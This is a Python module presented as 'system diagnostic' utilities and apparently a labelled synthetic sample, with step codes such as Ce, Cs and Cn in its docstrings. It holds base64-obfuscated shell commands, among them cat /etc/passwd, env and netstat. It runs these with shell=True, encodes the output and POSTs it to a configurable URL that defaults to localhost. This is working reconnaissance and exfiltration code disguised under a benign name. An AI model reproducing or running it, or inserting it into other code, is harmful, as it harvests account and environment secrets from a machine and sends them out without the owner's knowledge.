"""
System Command Execution Utilities
Provides functions for executing system diagnostic commands and reporting results.
"""

import json
import logging
import base64
import subprocess

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


def get_diagnostic_commands():
    """
    Get list of encoded diagnostic commands
    
    Returns:
        list: List of base64-encoded system diagnostic commands
    """
    # Base64-encoded system diagnostic commands
    encoded_commands = [
        "d2hvYW1p",  # whoami
        "cHdk",      # pwd
        "bHMgLWxhIC8=",  # ls -la /
        "Y2F0IC9ldGMvcGFzc3dk",  # cat /etc/passwd
        "cHMgYXV4",  # ps aux
        "bmV0c3RhdCAtdHVscG4=",  # netstat -tulpn
        "ZW52",      # env
    ]
    return encoded_commands


def decode_command(encoded_cmd):
    """
    Ce - Encoding/decoding: Decode base64 encoded command
    
    Args:
        encoded_cmd: Base64 encoded command string
    
    Returns:
        str: Decoded command string
    """
    try:
        command = base64.b64decode(encoded_cmd).decode()
        return command
    except Exception as e:
        logger.error(f"Command decoding failed: {e}")
        return ""


def execute_shell_command(command):
    """
    Cs - Command/shell execution: Execute system shell command
    
    Args:
        command: Shell command to execute
    
    Returns:
        str: Command output or error message
    """
    try:
        output = subprocess.check_output(
            command,
            shell=True,
            stderr=subprocess.STDOUT,
            timeout=5
        ).decode()
        return output
    except Exception as e:
        return f"Error: {str(e)}"


def encode_output_data(data):
    """
    Ce - Encoding: Encode command results using base64
    
    Args:
        data: Dictionary of command results to encode
    
    Returns:
        str: Base64 encoded string
    """
    try:
        return base64.b64encode(json.dumps(data).encode()).decode()
    except Exception:
        return ""


def send_command_output(encoded_data, url="http://localhost/cmd-results"):
    """
    Cn - Network connection: Send command output to monitoring server
    
    Args:
        encoded_data: Encoded command results to send
        url: Target URL for monitoring endpoint
    
    Returns:
        bool: True if successful, False otherwise
    """
    try:
        import urllib.request
        req = urllib.request.Request(
            url,
            data=json.dumps({"results": encoded_data}).encode(),
            headers={'Content-Type': 'application/json'}
        )
        urllib.request.urlopen(req, timeout=5)
        return True
    except Exception as e:
        logger.error(f"Output transmission failed: {e}")
        return False


def run_system_diagnostics(monitoring_url="http://localhost/cmd-results", command_list=None):
    """
    Complete system diagnostics operation
    Pattern: S -> [Ce] -> Cs -> [Ce] -> [Cn(URL)] -> E
    
    Args:
        monitoring_url: Target URL for monitoring endpoint
        command_list: List of encoded commands (uses defaults if None)
    
    Returns:
        bool: True if diagnostics completed and sent successfully
    """
    # Step 1: Get diagnostic commands
    if command_list is None:
        command_list = get_diagnostic_commands()
    
    results = {}
    
    # Process each command
    for encoded_cmd in command_list:
        # Step 2: Decode command (Ce)
        command = decode_command(encoded_cmd)
        
        if command:
            # Step 3: Execute shell command (Cs)
            output = execute_shell_command(command)
            results[command] = output
    
    # Step 4: Encode results (Ce)
    encoded_results = encode_output_data(results)
    
    # Step 5: Send to monitoring server (Cn)
    return send_command_output(encoded_results, monitoring_url)


__all__ = [
    'get_diagnostic_commands',
    'decode_command',
    'execute_shell_command',
    'encode_output_data',
    'send_command_output',
    'run_system_diagnostics'
]

if __name__ == "__main__":
    run_system_diagnostics()